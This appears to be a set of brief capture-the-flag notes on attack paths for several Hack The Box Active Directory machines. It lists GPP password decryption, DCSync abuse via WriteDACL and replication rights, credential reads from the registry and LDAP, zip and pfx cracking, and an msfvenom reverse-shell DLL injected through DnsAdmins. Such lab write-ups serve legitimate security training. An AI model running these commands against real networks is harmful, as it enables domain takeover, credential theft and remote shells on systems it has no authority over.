
#### Active => GPP in xml 
SMB: ` gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ ` 

#### Forest => LDAP 
1. Run ldapsearch, rpcclient, enum4linux to get users 
2. Run net users, whoami, bloodhound to see *WriteDACL* = can grant DCsync 
3. Add user to group with WriteDACL 

#### Sauna => usernames from website 
1. WinPEAS found autologon creds 
2. ` reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon" ` 
3. User has GetChanges & GetChangesAll = can do DCsync 

#### Support => decompile UserInfo.exe 
1. Can use https://github.com/dnSpy/dnSpy or `ilspycmd -p -o reverse_userinfo UserInfo.exe` 
2. Find pw in ldapsearch **'info'** field 
3. Group has GenericAll on domain = reset password for DC$ machine 

#### Timelapse => john the zip 
1. ` zip2john backup.zip > zip.hash ` then ` john ziphash.txt > pw.txt ` 
2. ` pfx2john auth.pfx > pfxhash.hash ` then ` john pfxhash.txt > pfxcracked.txt ` 

#### Resolute => pw in discription 
1. Run rpcclient `querydispinfo` to get password 
2. Run `dir -force` to see hidden files 
3. User is in DnsAdmins group = use dnscmd.exe to inject msfvenom DLL 
4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT=443 -f dll -o rev.dll` 

#### Cascade => pw in ldapsearch 
1. 1st password Base64 encoded! 2nd password TightVNC encrypted. 
2. 3rd password custom encoded = https://dev.to/micheaol/htb-cascade-walkthrough-1pik 
3. ` Get-ADObject -Filter 'isDeleted -eq $true -and name -like "*Admin*"' -IncludeDeletedObjects -Properties * ` 
